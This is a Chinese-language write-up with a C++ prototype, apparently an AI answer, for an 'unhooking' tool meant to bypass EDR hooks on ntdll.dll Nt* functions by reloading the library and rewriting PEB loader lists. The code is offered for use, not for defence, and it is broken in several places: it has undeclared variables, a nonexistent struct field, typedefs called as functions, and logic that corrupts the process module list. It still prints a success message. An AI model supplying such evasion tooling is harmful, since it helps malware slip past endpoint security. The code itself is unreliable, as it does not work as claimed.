以下是一个基于 **Windows API** 和 **反汇编技术** 的 **Syscall Unhooking 工具** 原型代码。该工具通过 **重新映射 `ntdll.dll`** 并 **恢复被 EDR（Endpoint Detection and Response）钩住的原始 `Nt*` 函数**，从而实现 **Syscall Unhooking**。

---

### **工具原理**
1. **获取原始 `ntdll.dll` 文件**：从系统安装目录（如 `C:\Windows\System32`）或其他可信路径加载原始 `ntdll.dll`。
2. **修复 IAT（Import Address Table）**：将 `ntdll.dll` 的 `Nt*` 函数指针指向原始实现（而不是 EDR 钩住的版本）。
3. **重新加载 `ntdll.dll`**：通过 `LoadLibrary` 和 `GetProcAddress` 重新注入原始函数。
4. **修复 PEB（Process Environment Block）**：确保 `PEB.Ldr` 指向正确的 `ntdll.dll` 实例。

---

### **代码实现（C++）**
```cpp
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <map>
#include <iostream>

#pragma comment(lib, "ntdll.lib")

// 定义必要的结构体
typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY ModuleList;
    PVOID Reserved0[2];
    HANDLE ProcessReferences;
    BYTE Reserved1[8];
    SIZE_T SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG LastStatus;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPoint;
    ULONG Reserved2[5];
    LONG BaseRelocationBase;
    ULONG GpaReserved[3];
    ULONG Reserved3;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// 函数指针类型
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

// 存储原始函数地址
std::map<std::string, PVOID> OriginalSyscalls;

// 从内存中读取数据
bool ReadMemory(HANDLE hProcess, PVOID addr, PVOID buffer, SIZE_T size) {
    SIZE_T bytesRead;
    return (NT_SUCCESS(pNtReadVirtualMemory(hProcess, addr, buffer, size, &bytesRead)));
}

// 写入内存数据
bool WriteMemory(HANDLE hProcess, PVOID addr, PVOID buffer, SIZE_T size) {
    SIZE_T bytesWritten;
    return (NT_SUCCESS(pNtWriteVirtualMemory(hProcess, addr, buffer, size, &bytesWritten)));
}

// 获取 PEB 地址
PVOID GetPEB() {
    PPEB peb = (PPEB)__readgsqword(0x60); // Windows 10+ 使用 GS 寄存器
    return peb;
}

// 获取 LDR 模块列表
PLDR_DATA_TABLE_ENTRY GetLdrModuleList() {
    PPEB peb = GetPEB();
    PPEB_LDR_DATA ldr = peb->Ldr;
    return CONTAINING_RECORD(ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);
}

// 加载原始 ntdll.dll
bool LoadOriginalNtdll(PVOID* pNtdllBase) {
    WCHAR ntdllPath[MAX_PATH];
    if (!GetSystemDirectoryW(ntdllPath, MAX_PATH)) {
        return false;
    }
    wcscat_s(ntllPath, MAX_PATH, L"\\ntdll.dll");

    HMODULE hNtdll = LoadLibraryW(ntdllPath);
    if (!hNtdll) {
        return false;
    }

    *pNtdllBase = hNtdll;
    return true;
}

// 修复 IAT（Import Address Table）
bool FixIAT(HMODULE hModule) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dosHeader->e_lfanew);
    PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (importDir->Size == 0) {
        return false;
    }

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)hModule + importDir->VirtualAddress);

    while (importDesc->Name) {
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + importDesc->FirstThunk);
        PIMAGE_THUNK_DATA nameThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + importDesc->NameThunk);

        while (nameThunk->u1.AddressOfData) {
            PIMAGE_IMPORT_BY_NAME importName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)hModule + nameThunk->u1.AddressOfData);

            if (strstr((char*)importName->Name, "Nt") == importName->Name) {
                // 记录原始函数地址
                PVOID funcAddr = (PVOID)GetProcAddress(hModule, (LPCSTR)importName->Name);
                OriginalSyscalls[(char*)importName->Name] = funcAddr;
            }

            thunk++;
            nameThunk++;
        }

        importDesc++;
    }

    return true;
}

// 重新映射 ntdll.dll
bool ReloadNtdll() {
    PVOID originalNtdllBase = nullptr;
    if (!LoadOriginalNtdll(&originalNtdllBase)) {
        return false;
    }

    if (!FixIAT(originalNtdllBase)) {
        return false;
    }

    // 修复 PEB 中的 ntdll.dll 指针
    PPEB peb = GetPEB();
    PLDR_DATA_TABLE_ENTRY ldrEntry = GetLdrModuleList();

    while (true) {
        if (ldrEntry->BaseDllName.Buffer && wcsstr(ldrEntry->BaseDllName.Buffer, L"ntdll.dll")) {
            // 保存原始 ntdll.dll 地址
            PVOID originalNtdllAddr = ldrEntry->DllBase;

            // 修复 IAT 指向原始 ntdll.dll
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)originalNtdllAddr;
            PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)originalNtdllAddr + dosHeader->e_lfanew);
            PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

            if (importDir->Size) {
                PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)originalNtdllAddr + importDir->VirtualAddress);

                while (importDesc->Name) {
                    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)originalNtdllAddr + importDesc->FirstThunk);

                    while (thunk->u1.Function) {
                        // 修复 IAT 指向原始函数
                        thunk->u1.Function = (ULONG_PTR)OriginalSyscalls[thunk->u1.Name];
                        thunk++;
                    }

                    importDesc++;
                }
            }

            // 重新加载 ntdll.dll
            FreeLibrary((HMODULE)originalNtdllAddr);
            HMODULE hNewNtdll = LoadLibraryW(L"ntdll.dll");
            if (!hNewNtdll) {
                return false;
            }

            // 更新 PEB 中的 ntdll.dll 指针
            peb->Ldr->InMemoryOrderModuleList.Flink = ldrEntry->InMemoryOrderModuleList.Flink;
            peb->Ldr->InMemoryOrderModuleList.Blink = ldrEntry->InMemoryOrderModuleList.Blink;
            ldrEntry->InMemoryOrderModuleList.Flink->Blink = &peb->Ldr->InMemoryOrderModuleList;
            ldrEntry->InMemoryOrderModuleList.Blink->Flink = &peb->Ldr->InMemoryOrderModuleList;

            return true;
        }

        if (ldrEntry->InMemoryOrderModuleList.Flink == &peb->Ldr->InMemoryOrderModuleList) {
            break;
        }

        ldrEntry = CONTAINING_RECORD(ldrEntry->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);
    }

    return false;
}

int main() {
    // 获取当前进程句柄
    HANDLE hProcess = GetCurrentProcess();

    // 重新映射 ntdll.dll
    if (!ReloadNtdll()) {
        printf("Failed to reload ntdll.dll\n");
        return 1;
    }

    printf("Successfully unhooked ntdll.dll syscalls!\n");
    return 0;
}
```

